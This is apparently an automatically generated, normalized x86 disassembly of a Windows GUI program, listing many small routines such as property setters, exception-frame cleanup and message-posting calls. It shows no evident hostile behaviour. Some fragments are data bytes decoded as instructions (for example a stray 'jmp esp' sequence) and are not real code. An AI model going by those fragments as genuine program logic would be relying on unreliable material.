push sub_44c482
mov eax [ ebp - 0x10 ]
call sub_40326c
retn
sub_44c47b
jmp sub_4039c0
sub_44c482
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44c49f
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
sub_44c498
jmp sub_4039c0
sub_44c49f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44c508
jmp sub_4039c0
sub_44c621
jmp sub_4039c0
sub_44c63e
jmp sub_4039c0
sub_44c7f6
jmp sub_4039c0
sub_44c7fd
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44c840
inc [ eax + 0x5c ]
retn
sub_44c844
push esi
cmp [ eax + 0x5c ] 0x0
jle r-xdata
cmp [ eax + 0x58 ] 0x0
je r-xdata
dec [ eax + 0x5c ]
pop esi
retn
mov [ eax + 0x58 ] 0x0
mov si 0xffef
call sub_403468
sub_44c898
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_44c8d5
jmp sub_4039c0
sub_44c8dc
pop ebp
retn
sub_44c8e0
sub [ rw-data ] 0x1
retn
sub_44d7eb
jmp [ eax + eax ]
sub_44d848
mov eax [ esp + 0x8 ]
retn
sub_44d850
push ebx
mov ebx eax
call sub_44d848
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
jmp sub_4039f8
sub_44d86c
pop ebx
retn
sub_44dae5
jmp sub_4039c0
sub_44daec
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44dc37
jmp sub_4039c0
sub_44dc3e
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44dc54
push ebx
mov eax [ rw-data ]
call sub_413ee0
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_413e9c
mov eax ebx
pop ebx
retn
sub_44dddc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_44ddf8
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_40341c
mov al [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_44e4f3
jmp sub_4039c0
sub_44e4fa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_44e5f2
jmp sub_4039c0
sub_44e5f9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ea1c
jmp sub_4039c0
sub_44ea23
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_44eecf
jmp sub_4039c0
sub_44f370
jmp sub_4039c0
sub_44f377
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44f7db
jmp sub_4039c0
sub_44fc98
jmp sub_4039c0
sub_44fc9f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45004a
jmp sub_4039c0
sub_450051
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45005f
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45020c
mov eax [ r-xdata ]
retn
sub_450248
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45025c
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45026c
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45027c
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_450578
mov edx eax
sub_450314
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
mov edx esi
call sub_450294
pop esi
pop ebx
retn
sub_450390
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_450578
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_413a24
mov ecx eax
sub_450768
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_4507d0
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_450b78
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_450bac
sub_450bac
mov edx sub_450b84
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_44dcd4
retn
sub_450d96
jmp sub_4039c0
sub_450d9d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451234
jmp sub_4039c0
sub_451273
jmp sub_4039c0
sub_45127a
mov al [ ebp - 0x1a ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_451418
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_451554
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_403468
pop esi
pop ebp
retn 0x8
sub_451570
mov eax [ eax + 0x34 ]
call sub_44e7a8
retn
sub_45157c
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_403468
pop esi
retn
sub_4515b8
push ebx
mov ecx sub_451590
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44dcd4
pop ebx
retn
sub_4517ec
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_451800
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
j_sub_40370c#8
jmp sub_40370c
sub_451a37
jmp sub_4039c0
sub_451a62
jmp sub_4039c0
sub_451a69
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_451a80
mov al [ eax + 0x41 ]
xor al 0x1
retn
sub_451c68
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4515b8
sub_451ce8
jmp sub_4039c0
sub_451d2c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_451d44
push ebx
mov ebx eax
mov eax ebx
call sub_4197d0
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_451d96
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_4515b8
sub_451e0c
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_451f55
jmp sub_4039c0
sub_451f5c
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45219c
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_4521ac
sub_452200
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
mov al [ eax + rw-data ]
retn
sub_452210
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_452220
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
mov al [ eax + rw-data ]
retn
sub_452230
and edx 0x7f
mov dl [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_452240
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4522b8
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e600
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_44e600
retn
sub_4522d4
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_44e600
sub_45231c
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_451570
retn
mov eax edx
retn
sub_452356
jmp sub_40370c
sub_45235b
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4526c1
jmp sub_4039c0
sub_4526c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_40326c
retn
sub_4526de
jmp sub_4039c0
sub_4527df
jmp sub_4039c0
sub_4527e6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452803
mov eax [ ebp - 0x14 ]
call sub_40326c
retn
sub_4527fc
jmp sub_4039c0
sub_452821
jmp sub_4039c0
sub_4528ab
jmp sub_4039c0
sub_4528b2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4528e4
push ebx
mov ebx eax
mov eax ebx
call sub_413b0c
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_41a580
sub_4529a8
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_4529bc
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_4529c4
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_452d89
jmp sub_4039c0
sub_452d90
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_452e8f
retn
sub_452e90
jmp sub_4039c0
j_sub_452e8f
jmp sub_452e8f
sub_452e97
pop ebp
retn
sub_454393
[ edi + edi * 8 - 0x2f002f ]
sub_45439a
stc
jmp esp
sub_4554c9
0x34c00041 0x40
inc esp
xchg esp eax
inc ecx
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
inc esp
retn
sub_45565c
mov eax [ rw-data ]
retn
sub_455664
mov [ rw-data ] eax
retn
j_sub_40370c#6
jmp sub_40370c
sub_4557e3
jmp sub_4039c0
sub_4557ea
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4559b8
call sub_41a4a8
retn
sub_455afa
jmp sub_4039c0
sub_455b01
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_455ba5
jmp sub_4039c0
sub_455bac
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_455c3c
mov al [ eax + 0x1f ]
xor al 0x1
retn
sub_456368
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_456a14
sub_456384
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_456368
sub_4564a4
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_456a14
sub_4564bc
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_456a14
sub_4564d4
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_456a14
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_456500
mov eax [ eax + 0x4 ]
mov al [ eax + 0x210 ]
xor al 0x1
retn
sub_45650c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_456a14
retn
sub_4567ec
push ebx
mov ebx edx
mov edx ebx
call sub_441584
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_45685c
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
sub_456984
jmp sub_4039c0
sub_45698b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_456994
push ebx
mov ebx eax
cmp [ ebx + 0x214 ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x208 ]
call sub_455da0
mov eax [ ebx + 0x20c ]
call sub_455da0
sub_4569f4
push esi
mov esi eax
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_456a04
push esi
mov esi eax
mov eax [ esi + 0x20c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_456aff
jmp sub_4039c0
sub_456b0c
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_456b24
sub_456d40
retn
sub_456dae
jmp sub_4039c0
sub_456ded
jmp sub_4039c0
sub_456e20
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_442a7c
retn
mov ecx [ eax + 0x208 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x208 ]
call sub_45602c
retn
sub_456e44
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_442a9c
retn
mov ecx [ eax + 0x20c ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x20c ]
call sub_45602c
retn
sub_456f39
jmp sub_4039c0
sub_456f40
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_455c94
mov eax [ ebp - 0x4 ]
call sub_456a14
sub_457018
cmp dl [ eax + 0x220 ]
je r-xdata
retn
mov [ eax + 0x220 ] dl
call sub_441c98
sub_45702c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45716c
jmp sub_4039c0
sub_4571a4
jmp sub_4039c0
sub_4571ab
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4571cb
lea eax [ ebp - 0x114 ]
call sub_403fbc
retn
sub_4571c4
jmp sub_4039c0
sub_4571cb
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4574d2
jmp sub_4039c0
sub_4574d9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4035e0
j_sub_40370c#7
jmp sub_40370c
j_sub_40370c#5
jmp sub_40370c
sub_4575ae
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457966
jmp sub_4039c0
sub_45796d
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_457a48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417760
mov [ ebx + 0x270 ] eax
pop esi
pop ebx
retn
sub_457a60
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_457a98
mov edx eax
mov eax esi
call sub_418fe8
pop esi
pop ebx
retn
sub_457a7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458e3c
mov edx eax
mov eax esi
call sub_418fe8
pop esi
pop ebx
retn
sub_457a98
push ebx
mov ebx eax
mov eax ebx
call sub_458adc
mov edx r-xdata
call sub_41d4a4
pop ebx
retn
sub_457b9c
push ebx
mov ebx eax
mov eax ebx
call sub_457bac
xor al 0x1
pop ebx
retn
sub_457bac
cmp [ eax + 0x210 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x208 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x20c ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_457c08
push ebx
cmp [ eax + 0x292 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x294 ]
call [ ebx + 0x290 ]
sub_457c28
push ebx
cmp [ eax + 0x2b2 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2b4 ]
call [ ebx + 0x2b0 ]
sub_457c48
push ebx
cmp [ eax + 0x2ca ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2cc ]
call [ ebx + 0x2c8 ]
sub_457f41
jmp sub_4039c0
sub_457f48
pop ecx
pop ebp
retn
sub_457f4c
xor eax eax
retn
sub_458224
jmp sub_4039c0
sub_45822b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_458241
jmp sub_4039c0
sub_45832b
jmp sub_4039c0
sub_458332
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45834f
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_458348
jmp sub_4039c0
sub_45836f
jmp sub_4039c0
sub_45865a
jmp sub_4039c0
sub_4587ed
jmp sub_4039c0
sub_458adc
mov eax [ eax + 0x238 ]
retn
sub_458ae4
mov eax [ eax + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_458af0
mov al [ eax + 0x5e ]
xor al 0x1
retn
sub_458e2e
jmp sub_4039c0
sub_458e35
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_458e3c
mov eax [ eax + 0x25c ]
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
sub_458e84
cmp dl [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] dl
test [ eax + 0x1c ] 0x10
jne r-xdata
call sub_441c98
sub_458ea0
cmp [ eax + 0x25c ] 0x0
setne al
retn
sub_458edc
push ebx
mov ebx eax
mov eax ebx
call sub_443c2c
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_41ce60
sub_458f60
push ebx
mov ebx eax
mov eax ebx
call sub_443c54
mov eax [ ebx + 0x238 ]
test eax eax
je r-xdata
pop ebx
retn
mov edx [ ebx + 0x68 ]
call sub_41d548
sub_458f80
push ebx
mov ebx eax
mov eax ebx
call sub_458ba0
mov edx [ ebx + 0x248 ]
mov eax ebx
call sub_458c68
pop ebx
retn
sub_4597ad
lea eax [ ebp - 0xb4 ]
call sub_403fbc
retn
sub_4597b9
jmp sub_4039c0
j_sub_4597ad
jmp sub_4597ad
sub_4597c0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_459918
jmp sub_4039c0
sub_45991f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459c04
jmp sub_4039c0
sub_459c0b
mov eax [ rw-data ]
call sub_45c4bc
mov bl 0x1
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_459c22
add [ eax ] al
retn
sub_459e80
push ebx
cmp [ eax + 0x2ba ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2bc ]
call [ ebx + 0x2b8 ]
sub_459ea0
mov eax [ eax + 0x240 ]
call sub_422f50
test eax eax
jne r-xdata
retn
mov eax [ rw-data ]
call sub_45e25c
sub_459f47
jmp sub_4039c0
sub_459f4e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_459f71
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_41d520
retn
sub_459f6a
jmp sub_4039c0
sub_459f71
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_459ea0
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_45a398
mov ecx [ eax + 0x248 ]
test ecx ecx
je r-xdata
retn
mov edx [ edx + 0x4 ]
mov eax ecx
call sub_451724
sub_45a483
jmp sub_4039c0
sub_45a48a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45a490
cmp [ eax + 0x22f ] 0x2
jne r-xdata
cmp [ edx + 0x4 ] 0x0
setne dl
call sub_459c78
test [ eax + 0x1c ] 0x10
je r-xdata
retn
sub_45a4e8
call sub_45b210
retn
sub_45a935
jmp sub_4039c0
sub_45a93c
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_40370c#4
jmp sub_40370c
j_sub_40370c#3
jmp sub_40370c
sub_45b0cd
jmp sub_4039c0
sub_45b0d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b0f1
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_45b0ea
jmp sub_4039c0
sub_45b0f1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45b0f8
push ebx
mov ebx eax
mov eax [ ebx + 0x240 ]
call sub_422f50
test eax eax
jne r-xdata
pop ebx
retn
xor edx edx
mov eax ebx
call sub_457b40
sub_45b118
call sub_40326c
retn
sub_45b170
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_45b1d6
jmp sub_4039c0
j_sub_40370c#2
jmp sub_40370c
sub_45b3b0
xor edx edx
call sub_457ea4
retn
sub_45b3b8
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_457ea4
mov eax ebx
call sub_43e124
pop ebx
retn
sub_45b43e
jmp sub_4039c0
sub_45b445
pop ebx
pop ecx
pop ebp
retn
sub_45b44c
push ebx
mov ebx eax
push 0x0
push 0x0
push 0xb021
mov eax ebx
call sub_4446f8
push eax
call PostMessageA
pop ebx
retn
sub_45b650
jmp sub_4039c0
sub_45b6f1
jmp sub_4039c0
sub_45b6fb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b71a
mov eax [ rw-data ]
call sub_45d934
retn
sub_45b713
jmp sub_4039c0
sub_45b71a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b737
lea eax [ ebp - 0x20 ]
call sub_403fbc
retn
sub_45b730
jmp sub_4039c0
sub_45b737
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45b818
cmp [ eax + 0x30 ] 0x0
jne r-xdata
call sub_43d2d0
retn
mov edx eax
mov eax [ rw-data ]
call sub_45cf88
retn
sub_45bb9c
mov edx eax
mov eax [ rw-data ]
call sub_45e9a8
mov al 0x1
retn
sub_45bc84
cmp dl [ eax + 0x2e0 ]
je r-xdata
retn
mov [ eax + 0x2e0 ] dl
call sub_45bbac
sub_45bc98
cmp dl [ eax + 0x2e1 ]
je r-xdata
retn
mov [ eax + 0x2e1 ] dl
call sub_45bbac
sub_45bcac
cmp edx [ eax + 0x2ec ]
je r-xdata
retn
mov [ eax + 0x2ec ] edx
call sub_45bbac
sub_45bcc0
cmp dl [ eax + 0x2e8 ]
je r-xdata
retn
mov [ eax + 0x2e8 ] dl
call sub_45bbac
sub_45bcd4
test [ eax + 0x1c ] 0x10
jne r-xdata
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ eax + 0x2e0 ] 0x0
jne r-xdata
or [ edx + 0x8 ] 0x80000
cmp [ eax + 0x2e8 ] 0x0
je r-xdata
sub_45be3f
jmp sub_4039c0
sub_45be46
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45be4c
push ebx
mov ebx eax
mov eax ebx
call sub_443010
mov eax ebx
call sub_443194
test eax eax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_45b44c
sub_45c0c2
jmp sub_4039c0
sub_45c0c9
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45c0d0
push ebx
mov ebx edx
mov edx ebx
call sub_443478
mov eax [ ebx + 0x8 ]
xor edx edx
call sub_43d3d8
pop ebx
retn
sub_45c124
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45c18c
mov eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45c13c
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45c18c
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45c158
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45c18c
mov eax [ esp + 0x4 ]
add esp 0x10
pop ebx
retn
sub_45c170
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_45c18c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45c40c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c418
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c424
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c430
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c43c
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c448
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c454
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4139c8
pop esi
pop ebx
retn
sub_45c468
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45c484
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_4139c8
pop esi
pop ebx
retn
sub_45c498
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45c4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_4139c8
pop esi
pop ebx
retn
sub_45c4b4
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45c590
mov eax [ eax + 0x54 ]
call sub_41386c
retn
sub_45c59c
mov eax [ eax + 0x54 ]
call sub_413b0c
retn
sub_45c7ef
jmp sub_4039c0
sub_45c833
jmp sub_4039c0
sub_45c83a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45c888
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45c688
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_404010
pop esi
pop ebx
retn
sub_45c8f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_4139c8
pop esi
pop ebx
retn
sub_45c908
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45cb0d
jmp sub_4039c0
sub_45cb14
pop ebx
mov esp ebp
pop ebp
retn
sub_45cb1c
inc [ eax + 0x8c ]
retn
sub_45cb24
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45cb44
sub_45cb44
xor edx edx
call sub_45cf88
retn
sub_45cf7a
jmp sub_4039c0
sub_45d001
jmp sub_4039c0
sub_45d010
add eax 0x30
call sub_40cd80
retn
sub_45d054
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_45d0a5
jmp sub_40370c
sub_45d0aa
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45d779
jmp sub_4039c0
sub_45d780
pop ebx
mov esp ebp
pop ebp
retn
sub_45d908
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
